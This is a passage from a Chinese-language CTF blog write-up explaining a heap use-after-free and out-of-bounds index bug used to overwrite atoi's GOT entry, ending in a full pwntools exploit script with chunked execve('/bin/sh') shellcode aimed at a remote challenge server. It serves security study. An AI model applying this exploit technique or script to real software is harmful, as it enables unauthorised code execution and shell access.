class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))<span class="comment">#用ljust进行右填充（左对齐）</span></span><br></pre></td></tr></table></figure>
<p>​        //这里在“jmp short”处选择右对齐，是为了防止“\x90\x90”干扰<strong>8位位移</strong>的计算</p>
<p>分析到这里就只剩下两个问题了：</p>
<p>1.<strong>codex</strong>超过了<strong>7字节</strong>，会导致execve的第一个参数无效（“/bin/sh”）</p>
<p>2.shellcode没有办法执行</p>
<p>堆不像栈，没有类似于<strong>“ret”</strong>这样的IP控制指令，想要执行堆中的shellcode片段，必须要<strong>CS:IP</strong>指针访问这一片堆空间才行，本程序中的shellcode片段已经用jmp进行了连接，所以只要<strong>CS:IP</strong>指针访问了<strong>codex</strong>，就等同于执行了shellcode</p>
<p>那么有没有一个办法可以一次性解决这两个问题呢？</p>
<p>仔细分析程序的代码，还可以发现一个漏洞：</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638867769887.png" class width="1638867769887"> 
<p>“index”由用户输入并且没有检查其范围，之后就直接作为了静态数组“2020A0”的下标</p>
<p>这就构成了<strong>数组越位漏洞</strong></p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638870007955.png" class width="1638870007955">
<p><br> <img src="/2021/12/07/%E5%A0%86-UAF/1638870031044.png" class width="1638870031044"> </p>
<p>静态数组“2020A0”的上方就是<strong>GOT表</strong>地址，这里的任何一个函数都可以被<strong>数组越位</strong>覆盖</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638871063099.png" class width="1638871063099"> 
<p>而且在<strong>plt表</strong>中已经控制了<strong>CS:IP</strong>，所以再此之后覆盖的堆内存会被当做指令</p>
<p>这里选择“atoi”是最正确的：</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638870249285.png" class width="1638870249285"> 
<p><br></p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638870283436.png" class width="1638870283436"> 
<p>分析代码就可以知道，“atoi”的参数是“read”读取来的，此处读入“/bin/sh”就可以代替<strong>codex</strong>了</p>
<img src="/2021/12/07/%E5%A0%86-UAF/1638870472468.png" class width="1638870472468"> 
<p>偏移计算为：（0x2020A0 - 0x202060）/ 8 = [-8]</p>
<p>因为改变“atoi”会导致循环中断，所以 <strong>[-8]</strong> 的堆空间只能在最后申请，但它又必须第一个执行</p>
<p>这里就需要利用<strong>UAF</strong>使  [0]（第一次申请的空间）和 [-8] 指向同一片内存（“atoi”的GOT表）</p>
<p>具体exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">53787</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line">code0=(asm(<span class="string">&#x27;xor rax,rax&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code1=(asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>)+<span class="string">&#x27;\xeb\x19&#x27;</span>)</span><br><span class="line">code2=(asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code3=(asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>)+<span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)</span><br><span class="line">code4=(asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0</span>,code0)</span><br><span class="line">malloc(<span class="number">1</span>,code1)</span><br><span class="line">malloc(<span class="number">2</span>,code2)</span><br><span class="line">malloc(<span class="number">3</span>,code3)</span><br><span class="line">malloc(<span class="number">4</span>,code4)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(-<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/29/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><span class="page-number current">30</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">300</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">155</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">64:07</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
